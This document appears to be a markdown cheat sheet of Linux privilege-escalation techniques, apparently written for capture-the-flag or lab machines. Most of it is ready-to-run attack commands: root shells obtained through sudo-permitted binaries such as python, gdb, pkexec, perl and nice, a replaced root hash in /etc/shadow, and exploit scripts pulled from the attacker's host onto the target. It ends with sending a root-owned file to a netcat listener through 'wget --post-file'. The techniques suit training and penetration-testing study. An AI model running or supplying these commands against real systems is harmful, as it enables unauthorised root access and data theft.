- ## Privilege escalation <a name="privilegeescalation"></a>
[easy way to get root/root.txt](#root.txt)
- `cat /etc/issue`
```
find / -o -group `id -g` -perm \ 
 -g=w -perm -u=s -o -perm -o=w\
 -perm -u=s -o -perm -o=w \
 -perm -g=s -ls
```
- ```python3 -c 'import os; os.system("/bin/bash")'```
- ```python -c 'import pty; pty.spawn("/bin/bash")'```
- ```python -c 'import os; os.setuid(0); os.system("/bin/sh")'```
- `echo os.system('/bin/bash')`
```
exec "/bin/sh";
perl —e 'exec "/bin/sh";'
```
> [!IMPORTANT]
> - If you have permission to write /etc/shadow use the below commands
> - First you need to creat a one hash password using openssl
> - `openssl passwd -1 -salt abc password123` it will give you a hash $1$abc$DSFILJKSD7393llsd.0s/ copy that
> - Edit the root password
> - `root:$1$abc$DSFILJKSD7393llsd.0s/:1772:0:99999:7:::`


- `os.execute('/bin/sh')`
- `exec "/bin/sh"`
- ```find /  -perm -u=s -type f 2>/dev/null``` to see the permission
- Use ```linpeas``` if you are not getting any escalation
  - download the script from the github
- If It was running on Linux Kernel 4.4.0–31-generic and Ubuntu 14.04.5 LTS. use below command
  - ```wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh```
  - ```chmod +x linux-exploit-suggester.sh``` and ```./linux-exploit-suggester.sh```
  - you will get some CVE, select any one CVE in that download URL will be there using that link you can download scripts
  - ```wget (download URL in CVE)``` download the file in your system
  - run ```sudo python -m http.server 80```
  - download the file in the target system ```wget http://<myip>/<filename>```
  - example: wget http://192.168.45.161/root.cpp
 
  
 - ```bash -p```
   
- if you find ```/usr/bin/python2.7``` in sudo -l
  - then use the below command it will give you the root privilege
  - ```/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash")'```
 
- if you find ```/usr/bin/gbd``` in sudo -l
  - then use the below command it will give you the root privilege
  - ```/usr/bin/gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit```
 

- if you find ```/usr/bin/pkexec``` in ```sudo -l``` 
  - then use the below command it will give you the root privilege
  - ```sudo pkexec /bin/bash```

- if you find ```/usr/bin/mtr``` in ```sudo -l``` 
  - then use the below command it will give you the root privilege
  - ```LFILE=/root/proof.txt```
  - ```sudo mtr --raw -F "$LFILE"```

- if you find ```/usr/bin/time``` in ```sudo -l``` 
  - then use the below command it will give you the root privilege
  - ```sudo /usr/bin/time /bin/bash```

- if you find ```(ALL : ALL) /bin/nice /notes/*``` in ```sudo -l```
  - it shows that you can run all the files in the /notes directory with /bin/nice binary.
  - so create a script letsgetroot.sh which executes /bin/bash and gave the necessary permissions.
  - ```echo "/bin/bash" >> letsgetroot.sh``` save the file in any directory
  - ```sudo /bin/nice /notes/../home/user/letsgetroot.sh``` it will give the root access.


- if you find ```(ALL : ALL) NOPASSWD: /usr/bin/perl``` in ```sudo -l```
  - then use the below command it will give you the root privilege
  - ```sudo perl -e 'exec "/bin/bash";'```

# easy way to get root/root.txt <a name="root.txt"></a>
### 1️⃣ Read the Root Flag Using --input-file:
- Use a root-only file (/root/root.txt) as an input to wget.
- It will try to parse it as a URL, fail, and leak the content (flag) in the error.
  - `sudo wget --input-file=/root/root.txt`


### 2️⃣ Exfiltrate the Flag Using --post-file:
- Use wget to send the flag to your attack machine.
- Steps:
  - 1. On your Kali machine, start a netcat listener:
    - `nc -lnvp 443`
  - 2. On the victim (sammy), run:
    - `sudo wget --post-file=/root/root.txt http://<your-ip>:443/`
- >The flag is sent to your listener.
